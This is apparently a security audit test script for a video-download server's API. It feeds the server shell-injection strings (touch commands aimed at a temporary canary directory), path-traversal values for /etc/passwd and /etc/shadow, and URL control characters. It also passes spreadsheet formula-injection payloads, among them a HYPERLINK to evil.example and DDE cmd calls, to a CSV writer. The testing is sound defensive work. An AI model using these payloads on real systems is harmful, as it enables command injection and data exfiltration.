/**
 * File: g9-fields.cjs
 * Path: audit/run-2/area-G/g9-fields.cjs
 * Description: The inputs run 1 reached late — everything except the URL.
 *   A  `quality`: still a free string? Does a non-numeric value skip the
 *      sign-in requirement, and where does it land in the child's argv (mp4
 *      format selector, mp3 --audio-quality, and ffmpeg's -b:a)?
 *   B  a filesystem canary for every non-URL field (quality, jobId, format,
 *      deliver, segment numbers), so "nothing reaches a shell" is measured for
 *      them too and not only for the URL.
 *   C  `segments`: a range shorter than one frame, a range of 0.001 s, 20 and
 *      21 ranges, a range past the end, `-0`, and 1e-9.
 *   D  the progress channel: an unknown id, a finished id, a re-poll 6 s
 *      after done, and whether polling an id grows the server's job map.
 *   E  F-5: does every pre-flight failure carry diagnostics?
 *   F  G-19: a null byte and other control characters in the URL.
 *   G  E-7: server/csv.ts's csvCell against a hostile set, next to the
 *      renderer's rule from src/lib/channel.ts.
 */
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const G = require("./glib.cjs");

const CANARY_DIR = fs.mkdtempSync(path.join(os.tmpdir(), "g2canary-"));

function body(extra = {}) {
  return {
    url: G.YT_URL,
    format: "mp4",
    quality: "360",
    deliver: "path",
    segments: [{ start: 0, end: 2 }],
    ...extra,
  };
}

function argvFlag(call, flag) {
  const i = call.argv.indexOf(flag);
  return i >= 0 ? call.argv[i + 1] : null;
}

async function main() {
  const out = { when: new Date().toISOString() };
  const s = await G.startServer({
    label: "fields",
    cfg: { duration: 30, failSections: true },
  });

  // --- A + B. quality and a canary for every field ------------------------
  const canary = (n) => path.join(CANARY_DIR, n);
  const QUALITIES = [
    { q: "360", note: "valid" },
    { q: "1080", note: "valid, needs a session" },
    { q: "best", note: "valid, needs a session" },
    { q: "1080p", note: "non-numeric: does it skip the gate?" },
    { q: "../../etc/passwd", note: "path" },
    { q: `360; touch ${canary("q-semicolon")}`, note: "shell ;" },
    { q: `360$(touch ${canary("q-subshell")})`, note: "shell $()" },
    { q: "360`touch " + canary("q-backtick") + "`", note: "shell backtick" },
    { q: "1000000000", note: "absurd number" },
    { q: "-1", note: "negative" },
    { q: "0", note: "zero" },
    { q: "NaN", note: "NaN" },
    { q: "360\n--exec=touch " + canary("q-newline-exec"), note: "newline + --exec" },
  ];
  out.quality = [];
  for (const c of QUALITIES) {
    s.clearCalls();
    const r = await s.post(`/api/download?jobId=job_q`, body({ quality: c.q }), {
      timeout: 120_000,
    });
    const calls = s.calls();
    out.quality.push({
      ...c,
      status: r.status,
      code: r.json && r.json.code,
      error: r.json && r.json.error && r.json.error.slice(0, 90),
      engineRuns: calls.length,
      sawSimulateProbe: calls.some((x) => x.argv.includes("--simulate")),
      format: calls.map((x) => argvFlag(x, "--format")).find(Boolean) || null,
      qualityIsOneArgvElement: calls.some((x) => x.argv.includes(c.q)),
    });
  }
  // mp3: quality lands in --audio-quality and in ffmpeg's -b:a
  out.mp3 = [];
  for (const q of ["192", `192; touch ${canary("mp3-semicolon")}`, "../../x"]) {
    s.clearCalls();
    const r = await s.post(
      "/api/download?jobId=job_mp3",
      body({ format: "mp3", quality: q }),
      { timeout: 120_000 },
    );
    const calls = s.calls();
    out.mp3.push({
      quality: q,
      status: r.status,
      error: (r.json && r.json.error && r.json.error.slice(0, 120)) || null,
      audioQuality: calls.map((x) => argvFlag(x, "--audio-quality")).find(Boolean) || null,
      engineRuns: calls.length,
    });
  }
  // other fields
  out.otherFields = [];
  for (const [name, b] of [
    ["jobId with a shell payload", null],
    ["format invalid", body({ format: "mkv" })],
    ["deliver invalid", body({ deliver: "ftp" })],
    ["segments as a string", body({ segments: "0-4" })],
    ["segment start as a string", body({ segments: [{ start: "0", end: 4 }] })],
    ["segment with Infinity", body({ segments: [{ start: 0, end: 1e400 }] })],
    ["extra unknown fields", body({ output: "/etc/passwd", cookies: "/etc/shadow", ffmpegLocation: "/bin/sh" })],
  ]) {
    s.clearCalls();
    const route =
      name === "jobId with a shell payload"
        ? `/api/download?jobId=${encodeURIComponent(`job_x; touch ${canary("jobid")}`)}`
        : "/api/download?jobId=job_f";
    const r = await s.post(route, b || body(), { timeout: 120_000 });
    const calls = s.calls();
    out.otherFields.push({
      name,
      status: r.status,
      error: (r.json && r.json.error && String(r.json.error).slice(0, 120)) || null,
      engineRuns: calls.length,
      sawForbiddenFlag: calls.some((x) =>
        x.argv.some((a) => /\/etc\/(passwd|shadow)|\/bin\/sh/.test(String(a))),
      ),
    });
  }
  out.canaryFilesCreated = fs.readdirSync(CANARY_DIR);

  // --- C. segments --------------------------------------------------------
  out.segments = [];
  const SEG_CASES = [
    { name: "shorter than one frame (0.02s)", segs: [{ start: 5, end: 5.02 }] },
    { name: "0.001s", segs: [{ start: 5, end: 5.001 }] },
    { name: "two sub-frame ranges", segs: [{ start: 5, end: 5.02 }, { start: 10, end: 10.02 }] },
    { name: "one frame (0.04s)", segs: [{ start: 5, end: 5.04 }] },
    { name: "21 ranges", segs: Array.from({ length: 21 }, (_, i) => ({ start: i, end: i + 0.5 })) },
    { name: "past the end", segs: [{ start: 0, end: 90 }] },
    { name: "negative zero start", segs: [{ start: -0, end: 1 }] },
    { name: "1e-9 long", segs: [{ start: 1, end: 1 + 1e-9 }] },
  ];
  for (const c of SEG_CASES) {
    const r = await s.post("/api/download?jobId=job_s", body({ segments: c.segs }), {
      timeout: 300_000,
    });
    out.segments.push({
      name: c.name,
      status: r.status,
      code: r.json && r.json.code,
      error: (r.json && r.json.error && String(r.json.error).slice(0, 160)) || null,
      path: r.json && r.json.path,
      sizeOnDisk:
        r.json && r.json.path && fs.existsSync(r.json.path)
          ? fs.statSync(r.json.path).size
          : null,
      durationSec:
        r.json && r.json.path && fs.existsSync(r.json.path)
          ? G.ffprobeDuration(r.json.path) ?? "unreadable"
          : null,
    });
  }

  // --- D. the progress channel --------------------------------------------
  const sse = (id, ms = 1200) =>
    new Promise((resolve) => {
      const events = [];
      const req = require("node:http").request(
        { host: "127.0.0.1", port: s.port, path: `/api/download/progress?jobId=${encodeURIComponent(id)}`, method: "GET" },
        (res) => {
          res.on("data", (c) => events.push(c.toString().trim()));
        },
      );
      req.on("error", () => resolve({ error: true, events }));
      req.end();
      setTimeout(() => {
        req.destroy();
        resolve({ events });
      }, ms);
    });
  const done = await s.post("/api/download?jobId=job_done_1", body(), { timeout: 300_000 });
  out.progress = {
    finishedDownload: done.status,
    unknownId: await sse("job_never_existed"),
    traversalId: await sse("../../etc/passwd"),
    longId: await sse("L".repeat(3000)),
    rightAfterDone: await sse("job_done_1"),
  };
  await G.sleep(6500);
  out.progress.sixSecondsAfterDone = await sse("job_done_1");

  // --- E. F-5 diagnostics on pre-flight failures --------------------------
  out.preflightDiagnostics = [];
  const preflights = [
    {
      name: "probe failure",
      cfg: { failProbe: true, stderr: "ERROR: Unable to extract player response" },
      body: body(),
    },
    {
      name: "out point past the end",
      cfg: { duration: 10 },
      body: body({ segments: [{ start: 0, end: 30 }] }),
    },
    {
      name: "1080 with no session",
      cfg: { duration: 30 },
      body: body({ quality: "1080" }),
    },
    {
      name: "rate limited",
      cfg: { duration: 30, authOutput: "ERROR: HTTP Error 429: Too Many Requests" },
      body: body({ quality: "1080", cookiesFromBrowser: "chrome" }),
    },
    {
      name: "stale session",
      cfg: { duration: 30, authOutput: "ERROR: Sign in to confirm your age" },
      body: body({ quality: "1080", cookiesFromBrowser: "chrome" }),
    },
  ];
  for (const p of preflights) {
    s.configure({ duration: 30, failSections: true, ...p.cfg });
    const r = await s.post("/api/download?jobId=job_pf", p.body, { timeout: 300_000 });
    const d = r.json && r.json.diagnostics;
    out.preflightDiagnostics.push({
      name: p.name,
      status: r.status,
      code: r.json && r.json.code,
      hasDiagnostics: Boolean(d),
      jobId: d && d.jobId,
      stderrTailLines: d && Array.isArray(d.stderrTail) ? d.stderrTail.length : null,
      logLines: d && Array.isArray(d.logLines) ? d.logLines.length : null,
      leaksHomeDir: Boolean(d && d.homeDir),
    });
  }
  s.configure({ duration: 30, failSections: true });

  // --- F. control characters in the URL -----------------------------------
  out.controlChars = [];
  for (const u of [
    "https://www.youtube.com/watch?v=a\u0000b",
    "https://www.youtube.com/watch?v=a\u0007b",
    "https://www.youtube.com/watch?v=" + "a".repeat(200000),
    "https://www.youtube.com/watch?v=‮evil",
    "https://www.youtube.com/watch?v=a%00b",
  ]) {
    s.clearCalls();
    const r = await s.post("/api/info", { url: u });
    out.controlChars.push({
      url: u.slice(0, 60) + (u.length > 60 ? `...(${u.length} chars)` : ""),
      status: r.status,
      error: (r.json && r.json.error && String(r.json.error).slice(0, 160)) || (r.body || "").slice(0, 80),
      engineRuns: s.calls().length,
      looksInternal: /args\[0\]|must be a string without null bytes|ERR_/.test(
        JSON.stringify(r.json || r.body),
      ),
    });
  }

  await s.stop();

  // --- G. E-7, the CSV writer, called directly ----------------------------
  {
    const esbuild = require(path.join(G.repoRoot, "node_modules", "esbuild"));
    const file = path.join(
      G.repoRoot,
      "node_modules",
      ".cache",
      "g2-area-G",
      "csv.cjs",
    );
    esbuild.buildSync({
      entryPoints: [path.join(G.repoRoot, "server", "csv.ts")],
      outfile: file,
      bundle: true,
      platform: "node",
      format: "cjs",
      loader: { ".ts": "ts" },
      logLevel: "silent",
    });
    const csv = require(file);
    const HOSTILE = [
      "=cmd|' /C calc'!A1",
      '=HYPERLINK("http://evil.example/?x="&A1,"click")',
      "+1+1",
      "-2-2",
      "@SUM(1:1)",
      "\t=1+1",
      "\r=1+1",
      "=1+1, \"quoted\" 🎬 עברית",
      " =1+1",
      '"=1+1',
      "0x3D=1+1",
      "DDE('cmd';'/C calc';'!A0')",
      "=2+5+cmd|' /C calc'!A0",
      "-5",
      "+5.5",
      "5",
      "@",
    ];
    out.csv = HOSTILE.map((v) => ({
      input: JSON.stringify(v),
      cell: csv.csvCell(v),
      neutralised: csv.csvCell(v).startsWith("\"'"),
    }));
    out.csvNumbersUntouched = [
      { input: -5, cell: csv.csvCell(-5) },
      { input: 0, cell: csv.csvCell(0) },
      { input: null, cell: csv.csvCell(null) },
    ];
  }

  console.log(JSON.stringify(out, null, 2));
  console.log("results:", G.saveResults("g9-fields", out));
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
